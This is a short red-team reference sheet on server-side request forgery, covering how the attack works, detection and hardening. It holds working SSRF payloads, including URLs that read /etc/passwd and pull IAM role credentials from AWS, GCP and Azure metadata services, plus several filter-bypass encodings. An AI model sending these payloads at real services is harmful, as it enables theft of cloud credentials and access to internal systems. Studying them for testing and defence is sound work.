---
title: "Server-Side Request Forgery (SSRF)"
category: "red-team"
tags: ["web", "ssrf", "owasp", "cloud"]
platform: "web"
mitre: ["T1190"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Server-Side Request Forgery (SSRF)

## TL;DR
The application fetches a user-supplied URL → you force the server to make requests to internal resources (cloud metadata, internal services, port scan). In the cloud it leads to theft of IAM credentials.

## Payloads
```text
http://127.0.0.1:80/           # localhost
http://169.254.169.254/        # cloud metadata (AWS/GCP/Azure)
http://[::1]/                  # IPv6 loopback
file:///etc/passwd             # file scheme
gopher://...                   # smuggling to services (Redis, SMTP)
```

## Cloud metadata (the SSRF prize)
```bash
# AWS IMDSv1 (if enabled) – role theft
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# GCP (requires a header)
http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata: true)
```

## Filter bypasses
```text
http://0177.0.0.1     (octal)   http://2130706433 (decimal)
http://localhost.attacker.com   (DNS rebinding)
http://foo@127.0.0.1  (userinfo)  301->internal redirects
```

## Detection (Blue Team)
- The app server connecting to `169.254.169.254` / internal IPs.
- Anomalous outbound requests from the application layer.

## Mitigation / Hardening
- **IMDSv2** (AWS, requires a token — blocks simple SSRF), remove IMDSv1.
- Allow-list of target hosts, block RFC1918/link-local, validate after DNS resolution.
- Network segmentation, no app→metadata access where unneeded.

## Sources
- [PortSwigger – SSRF](https://portswigger.net/web-security/ssrf)
